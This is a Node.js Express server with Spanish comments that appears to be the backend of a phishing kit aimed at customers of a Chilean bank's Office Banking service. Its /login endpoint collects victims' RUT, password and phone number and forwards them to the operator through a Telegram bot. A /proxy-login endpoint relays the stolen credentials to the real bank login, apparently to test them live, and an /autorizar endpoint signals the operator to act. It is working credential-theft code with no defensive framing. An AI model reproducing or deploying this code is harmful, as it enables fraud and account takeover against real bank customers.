const express = require("express");
const fetch = require("node-fetch");
const cors = require("cors");

const app = express();

// Habilitar CORS para permitir llamadas desde GitHub Pages
app.use(cors());

// Middleware para parsear JSON y formularios
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Credenciales desde variables de entorno en Render
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// Lista de RUTs bloqueados
const bloqueados = ["250624344", "25062434-4", "25.062.434-4"];

// Endpoint de login (envía datos a Telegram)
app.post("/login", async (req, res) => {
  const { rut, passwd, telefono } = req.body;

  if (!telefono) {
    return res.status(400).send("❌ El campo 'teléfono' es obligatorio.");
  }

  if (bloqueados.includes(rut)) {
    return res.status(403).send("❌ Tu clave digital ha sido bloqueada");
  }

  const mensaje = `Nuevo intento de login:
RUT: ${rut}
Contraseña: ${passwd}
Teléfono: ${telefono}`;

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
    });

    res.send("✅ Hemos recibido tu solicitud.");
  } catch (error) {
    console.error(error);
    res.status(500).send("❌ Error al ingresar tus datos. Inténtalo nuevamente");
  }
});

// Nuevo endpoint de proxy hacia Office Banking
app.post("/proxy-login", async (req, res) => {
  const { rut, passwd } = req.body;

  try {
    const externalResponse = await fetch("https://wslogin.officebanking.cl/", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({ rut, clave: passwd })
    });

    const result = await externalResponse.text();
    res.status(externalResponse.status).send(result);
  } catch (err) {
    console.error(err);
    res.status(500).send("❌ Error al conectar con Office Banking");
  }
});

// Endpoint de autorización (envía mensaje a Telegram)
app.post("/autorizar", async (req, res) => {
  const mensaje = "AUTORIZAR!!!";

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
    });

    res.send("✅ Autorización enviada");
  } catch (error) {
    console.error(error);
    res.status(500).send("❌ Error al enviar autorización.");
  }
});

// Iniciar servidor
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor corriendo en puerto ${PORT}`);
});
